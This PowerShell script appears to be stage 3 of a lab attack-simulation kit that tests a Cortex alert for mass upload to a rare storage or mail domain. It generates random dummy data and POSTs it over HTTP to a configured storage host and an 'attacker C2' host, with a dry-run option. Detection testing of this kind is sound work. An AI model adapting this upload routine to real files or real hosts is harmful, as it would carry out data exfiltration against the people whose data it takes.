<#
    Stage 3 (END) - Exfiltration: massive upload to a rare storage/mail domain
    =========================================================================
    The payoff - a large volume of (dummy) data pushed to an external storage /
    mail service the org rarely uses.

      EAL alert : 'Massive upload to a rare storage or mail domain'  (T1567.002)
      ATT&CK    : Exfiltration (TA0010) / Exfiltration Over Web Service: Cloud (T1567.002)
      NOTE: enable this detector in Cortex if off; the destination should
            categorise as online-storage/webmail. Points at the attacker by
            default (StorageDomain -> your rare storage host).
#>
param([switch]$DryRun)
. "$PSScriptRoot\..\config\lab-config.ps1"
. "$PSScriptRoot\_net.ps1"
$cfg = $Global:EalDemo
if ($DryRun) { $cfg.DryRun = $true }

$dest = if ($cfg.StorageDomain) { $cfg.StorageDomain } else { $cfg.AttackerC2 }
Write-Stage "STAGE 3 (END): uploading $($cfg.ExfilMegabytes) MB to rare storage/mail $dest" "INFO"
if ($cfg.DryRun) {
    Write-Host "  DRY: POST $($cfg.ExfilMegabytes) MB -> http://$dest/upload  (also -> attacker $($cfg.AttackerC2))"
} else {
    $tmp = Join-Path $env:TEMP "eal_c8_exfil.bin"
    try {
        $fs=[System.IO.File]::Create($tmp); $b=New-Object byte[] (1MB); $r=[System.Random]::new()
        for($i=0;$i -lt $cfg.ExfilMegabytes;$i++){ $r.NextBytes($b); $fs.Write($b,0,$b.Length) }; $fs.Close()
        foreach ($d in @($dest, $cfg.AttackerC2)) {
            try { Invoke-WebRequest -Uri "http://$d/upload" -Method Post -InFile $tmp -ContentType "application/octet-stream" -TimeoutSec $cfg.HttpTimeoutSec -UseBasicParsing | Out-Null
                  Write-Stage "  uploaded $($cfg.ExfilMegabytes) MB to $d" "OK" }
            catch { Write-Stage "  upload to $d rejected (large outbound flow still logged)" "BLOCK" }
        }
    } catch { Write-Stage "  payload error: $($_.Exception.Message)" "WARN" }
    finally { if (Test-Path $tmp) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue } }
}
Write-Stage "STAGE 3 done. Expect EAL: 'Massive upload to a rare storage or mail domain' (T1567.002)." "OK"
